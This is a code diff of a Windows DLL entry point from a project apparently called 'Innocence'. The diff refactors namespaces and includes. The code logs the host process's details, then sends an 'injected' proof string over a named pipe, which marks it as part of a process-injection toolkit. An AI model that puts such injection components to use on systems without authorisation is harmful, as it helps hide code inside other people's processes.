@@ -1,11 +1,11 @@
-#include <common/Log.hpp>
+#include <log/Log.hpp>
 #include <system/Uac.hpp>
 #include <system/Process.hpp>
 
 #include <network/Pipe.hpp>
 using namespace Network;
 
-#include <Innocence.hpp>
+#include <common/Innocence.hpp>
 
 #include <windows.h>
 
@@ -15,22 +15,21 @@ DWORD WINAPI Run(void)
 {
     try
 	{
-        LOG.setIdentity(Innocence::identity);
-        LOG.addObserver(new Common::LogToCollector);
+        LOG.setIdentity(Common::identity);
+        LOG.addObserver(new Log::LogToCollector);
 		
 		System::Process::This thisProcess;
 		LOG << "DLL getPath : " + thisProcess.getPath();
 		LOG << "Current process name : " + thisProcess.getProgramName();
-		LOG << "Current process id : " + toString(thisProcess.getPid());
-		LOG << "Parent process id : " + toString(thisProcess.getParentPid());
+		LOG << "Current process id : " + Common::toString(thisProcess.getPid());
+		LOG << "Parent process id : " + Common::toString(thisProcess.getParentPid());
 		
-		Sleep(1000);
 		Network::Pipe pipe;
-		pipe.listen(Innocence::PIPE_AUDIT_PIPE_NAME);
+		pipe.listen(Common::PIPE_AUDIT_PIPE_NAME);
 		if(pipe.accept())
 		{
-			pipe.send(Innocence::ISINJECTED_PROOF);
-			LOG << "Proof sent : " + std::string(Innocence::ISINJECTED_PROOF);
+			pipe.send(Common::ISINJECTED_PROOF);
+			LOG << "Proof sent : " + std::string(Common::ISINJECTED_PROOF);
 		}
 		pipe.disconnect();
 		
